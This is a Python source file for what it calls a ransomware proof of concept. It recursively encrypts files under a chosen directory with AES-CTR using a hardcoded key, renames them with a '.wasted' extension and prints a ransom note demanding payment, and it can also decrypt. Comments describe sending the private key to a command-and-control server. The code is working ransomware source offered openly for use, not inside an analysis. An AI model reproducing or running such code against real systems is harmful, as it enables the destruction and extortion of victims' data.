from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter

import argparse
import os
import sys
import base64
import platform 

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key used to encrypt files
extension = ".wasted" # Ransomware custom extension


def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                        action='store_true')

    return parser.parse_args()

def main():
    if len(sys.argv) <= 1:
        print('[*] Ransomware - PoC\n')
        # banner()
        print('Usage: python3 main.py -h')
        print('{} -h for help.'.format(sys.argv[0]))
        exit(0)

    # Parse arguments
    args = parse_args()
    encrypt = args.encrypt
    decrypt = args.decrypt
    absolute_path = str(args.path)

    if absolute_path != 'None':
        startdirs = [absolute_path]
    else:
        # Check OS
        plt = platform.system()
        if plt == "Linux" or plt == "Darwin":
            startdirs = [os.environ['HOME'] + '/test_ransomware']
        elif plt == "Windows":
            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
        else:
            print("Unidentified system")
            exit(0)
   
    # RSA Generation
    rsa_gen = RSA.generate(2048)
    publickey = rsa_gen.publickey()  

    # RSA Encryption function
    encryptor = PKCS1_OAEP.new(publickey)
    encrypted_key =  encryptor.encrypt(HARDCODED_KEY)
    
    ## RSA Decryption function
    # decryptor = PKCS1_OAEP.new(rsa_keys)
    # decrypted = decryptor.decrypt(str(encrypted_key))
  
    # RSA Public and Private Keys
    public_key = rsa_gen.publickey().exportKey()
    private_key = rsa_gen.export_key() # Private key sent via C2 or exfiltrated

    if encrypt:
        print("[COMPANY_NAME]\n\n"
            "YOUR NETWORK IS ENCRYPTED NOW\n\n"
            "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
            "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n\n"
            "DO NOT RENAME OR MOVE THE FILE\n\n"
            "THE FILE IS ECNRYPTED WITH THE FOLLOWING KEY\n"
            "[begin_key]\n{}\n[end_key]\n"
            "KEEP IT\n".format(public_key.decode("utf-8")))
        key = HARDCODED_KEY
    if decrypt:
        # In real ransomware, this part includes sending the private_key to the C2
        # and/or the encrypted AES keys and public_key 
        key = HARDCODED_KEY
           
    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            if decrypt and file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                file_original = os.path.splitext(file)[0]
                os.rename(file, file_original)
                print("File changed from " + file + " to " + file_original)
            if encrypt:
                modify.modify_file_inplace(file, crypt.encrypt)
                os.rename(file, file + extension)
                print("File changed from " + file + " to " + file + extension)

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    main()
